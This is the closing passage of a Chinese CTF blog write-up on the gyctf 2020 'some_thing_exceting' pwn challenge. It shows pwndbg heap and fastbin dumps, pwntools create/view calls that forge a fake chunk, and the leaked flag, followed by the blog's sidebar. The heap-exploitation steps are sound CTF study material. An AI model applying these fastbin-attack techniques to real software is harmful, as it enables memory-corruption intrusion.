class="line">Addr: 0xce6240</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0xce62d0</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xce6260</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0xce62c0</span><br><span class="line">Size: 0x61</span><br><span class="line">fd: 0x602098</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0xce6320</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0xce6240</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0xce6340</span><br><span class="line">Size: 0x61</span><br><span class="line">fd: 0xce62c0</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xce63a0</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0xce6400</span><br><span class="line">Size: 0x1fc01</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0xce6320 —▸ 0xce6240 —▸ 0xce62d0 ◂— 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0xce6340 —▸ 0xce62c0 —▸ 0x602098 ◂— &#39;flag&#123;winter_excited&#125;&#39;</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fake_chunk &#x3D; 0x6020a0 - 0x8</span><br><span class="line">create(0x50,p64(fake_chunk),0x50,p64(fake_chunk))#2</span><br></pre></td></tr></table></figure>

<h4 id="4-create4，create5（申请到fake地址）"><a href="#4-create4，create5（申请到fake地址）" class="headerlink" title="4.create4，create5（申请到fake地址）"></a>4.create4，create5（申请到fake地址）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x652000</span><br><span class="line">Size: 0x231</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x652230</span><br><span class="line">Size: 0x1011</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x653240</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x653260</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x6532c0</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x653320</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x653340</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x6533a0</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x653400</span><br><span class="line">Size: 0x81</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x653480</span><br><span class="line">Size: 0x1fb81</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x6532d0 ◂— 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x6e69777b67616c66 (&#39;flag&#123;win&#39;)</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x6020a0-8</span><br><span class="line">0x602098:	0x0000000000000000	0x0000000000000060</span><br><span class="line">0x6020a8:	0x6e69777b67610a61	0x696378655f726574</span><br><span class="line">0x6020b8:	0x000000007d646574	0x0000000000000000</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30s 0x6020a0-8</span><br><span class="line">0x602098:	&quot;&quot;</span><br><span class="line">0x602099:	&quot;&quot;</span><br><span class="line">0x60209a:	&quot;&quot;</span><br><span class="line">0x60209b:	&quot;&quot;</span><br><span class="line">0x60209c:	&quot;&quot;</span><br><span class="line">0x60209d:	&quot;&quot;</span><br><span class="line">0x60209e:	&quot;&quot;</span><br><span class="line">0x60209f:	&quot;&quot;</span><br><span class="line">0x6020a0:	&quot;&#96;&quot;</span><br><span class="line">0x6020a2:	&quot;&quot;</span><br><span class="line">0x6020a3:	&quot;&quot;</span><br><span class="line">0x6020a4:	&quot;&quot;</span><br><span class="line">0x6020a5:	&quot;&quot;</span><br><span class="line">0x6020a6:	&quot;&quot;</span><br><span class="line">0x6020a7:	&quot;&quot;</span><br><span class="line">0x6020a8:	&quot;a\nag&#123;winter_excited&#125;&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x50</span>,p64(fake_chunk),<span class="number">0x50</span>,p64(fake_chunk))<span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x50</span>,<span class="string">'a'</span>,<span class="number">0x70</span>,<span class="string">'a'</span>)<span class="comment">#2</span></span><br></pre></td></tr></table></figure>

<h4 id="5-打印4"><a href="#5-打印4" class="headerlink" title="5.打印4"></a>5.打印4</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0xac bytes:</span><br><span class="line">    &quot;# Banana&#39;s ba is a\n&quot;</span><br><span class="line">    &#39;ag&#123;winter_excited&#125;\n&#39;</span><br><span class="line">    &quot;# Banana&#39;s na is a\n&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">view(4)</span><br><span class="line">p.recv()</span><br></pre></td></tr></table></figure>

<p>以前写的：<a href="https://blog.csdn.net/qq_43935969/article/details/104756082?spm=1001.2014.3001.5501" target="_blank" rel="noopener">i春秋新春战役PWN之Some_thing_exceting</a></p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="gyctf_2020_some_thing_exceting">文件</a></p>

	
	</div>
  <a type="button" href="/2021/05/01/gyctf-2020-some-thing-exceting详解/#more" class="btn btn-default more">Read More</a>
</div>

		

		</div>

		<!-- pagination -->
		<div>
  		<center>
		<div class="pagination">

   
    
           <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
        

        <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
 
       <a href="/page/2/" type="button" class="btn btn-default ">Next<i class="fa fa-arrow-circle-o-right"></i></a>     
        

  
</div>

  		</center>
		</div>

		
		
	</div> <!-- col-md-9 -->

	
		<div class="col-md-3">
	<div id="sidebar">
	
			
  <div id="site_search">
   <div class="form-group">
    <input type="text" id="local-search-input" name="q" results="0" placeholder="Search" class="st-search-input st-default-search-input form-control"/>
   </div>  
  <div id="local-search-result"></div>
  </div>


		
			
	<div class="widget">
		<h4>Categories</h4>
		<ul class="tag_box inline list-unstyled">
		
			<li><a href="/categories/advanced-pwn/">advanced pwn<span>1</span></a></li>
		
			<li><a href="/categories/buu/">buu<span>13</span></a></li>
		
			<li><a href="/categories/chrome/">chrome<span>1</span></a></li>
		
			<li><a href="/categories/ida/">ida<span>1</span></a></li>
		
			<li><a href="/categories/iot/">iot<span>2</span></a></li>
		
			<li><a href="/categories/pwn/">pwn<span>6</span></a></li>
		
			<li><a href="/categories/reverse/">reverse<span>1</span></a></li>
		
			<li><a href="/categories/v8/">v8<span>1</span></a></li>
		
			<li><a href="/categories/专题/">专题<span>3</span></a></li>
		
			<li><a href="/categories/基础知识/">基础知识<span>1</span></a></li>
		
			<li><a href="/categories/复现/">复现<span>1</span></a></li>
		
			<li><a href="/categories/工具/">工具<span>1</span></a></li>
		
			<li><a href="/categories/常用软件/">常用软件<span>1</span></a></li>
		
			<li><a href="/categories/算法/">算法<span>8</span></a></li>
		
		</ul>
	</div>

		
			
	<div class="widget">
		<h4>Tag Cloud</h4>
		<ul class="tag_box inline list-unstyled">		
		
			<li><a href="/tags/double-free/">double free<span>1</span></a></li>
		
			<li><a href="/tags/fastbin-attack/">fastbin attack<span>1</span></a></li>
		
			<li><a href="/tags/googlectf-2020/">googlectf 2020<span>1</span></a></li>
		
			<li><a href="/tags/srop/">srop<span>1</span></a></li>
		
			<li><a href="/tags/出题环境/">出题环境<span>1</span></a></li>
		
			<li><a href="/tags/house-of-orange/">house of orange<span>1</span></a></li>
		
			<li><a href="/tags/v8/">v8<span>1</span></a></li>
		
			<li><a href="/tags/西南科技大学新生赛/">西南科技大学新生赛<span>1</span></a></li>
		
			<li><a href="/tags/牛客网/">牛客网<span>1</span></a></li>
		
			<li><a href="/tags/leetcode/">leetcode<span>1</span></a></li>
		
			<li><a href="/tags/安装/">安装<span>1</span></a></li>
		
			<li><a href="/tags/mips-pwn/">mips pwn<span>1</span></a></li>
		
			<li><a href="/tags/house-of-force/">house of force<span>2</span></a></li>
		
			<li><a href="/tags/fmt/">fmt<span>1</span></a></li>
		
			<li><a href="/tags/pwn/">pwn<span>1</span></a></li>
		
			<li><a href="/tags/基础知识/">基础知识<span>3</span></a></li>
		
			<li><a href="/tags/天梯赛/">天梯赛<span>1</span></a></li>
		
			<li><a href="/tags/蓝桥杯/">蓝桥杯<span>4</span></a></li>
		
			<li><a href="/tags/pwnable-tw/">pwnable.tw<span>2</span></a></li>
		
			<li><a href="/tags/基础练习/">基础练习<span>1</span></a></li>
		
		
		   <li><a href="/tags">...<span>31</span></a></li>
		 
		</ul>
	</div>


		
			
<div class="widget">
  <h4>Recent Posts</h4>
  <ul class="entry list-unstyled">
    
      <li>
        <a href="/2021/06/05/kernel-study/" ><i class="fa fa-file-o"></i>kernel study</a>
      </li>
    
      <li>
        <a href="/2021/05/13/Mar-DASCTF明御攻防赛/" ><i class="fa fa-file-o"></i>Mar.DASCTF明御攻防赛</a>
      </li>
    
      <li>
        <a href="/2021/05/13/pwn题模板/" ><i class="fa fa-file-o"></i>pwn wp模板</a>
      </li>
    
      <li>
        <a href="/2021/05/13/unsortedbin-attack/" ><i class="fa fa-file-o"></i>unsortedbin attack</a>
      </li>
    
      <li>
        <a href="/2021/05/13/house-of-orange/" ><i class="fa fa-file-o"></i>house of orange</a>
      </li>
    
  </ul>
</div>

		
			
<div class="widget">
	<h4>Links</h4>
	<ul class="blogroll list-unstyled">
	
		<li><i class="fa fa-github"></i><a href="https://github.com/wzpan/hexo-theme-freemind" title="Freemind's Github repository." target="_blank"]);">Freemind</a></li>
	
		<li><i class="fa fa-github"></i><a href="https://github.com/kristopolous/BOOTSTRA.386" title="BOOTSTRA.386's Github repository." target="_blank"]);">BOOTSTRA.386</a></li>
	
		<li><i class="fa fa-github"></i><a href="https://github.com/blackshow/hexo-theme-freemind.386" title="Freemind.386's Github repository." target="_blank"]);">Freemind.386</a></li>
	
		<li><i class="fa fa-github"></i><a href="http://www.github.com/blackshow" title="My Github account." target="_blank"]);">My Github</a></li>
	
	</ul>
</div>


		
	</div> <!-- sidebar -->
</div> <!-- col-md-3 -->

	
	
</div> <!-- row-fluid -->
	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  &copy; 2021 winter
  
      with help from <a href="http://hexo.io/" target="_blank">Hexo</a>,<a href="http://github.com/wzpan/hexo-theme-freemind/" target="_blank" rel="noopener">Freemind</a>,<a href="http://getbootstrap.com/" target="_blank">Twitter Bootstrap</a> and <a href="http://getbootstrap.com/" target="_blank">BOOTSTRA.386</a>. 
     <br> Theme by <a href="http://github.com/wzpan/hexo-theme-freemind/" target="_blank" rel="noopener">Freemind.386</a>.    
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
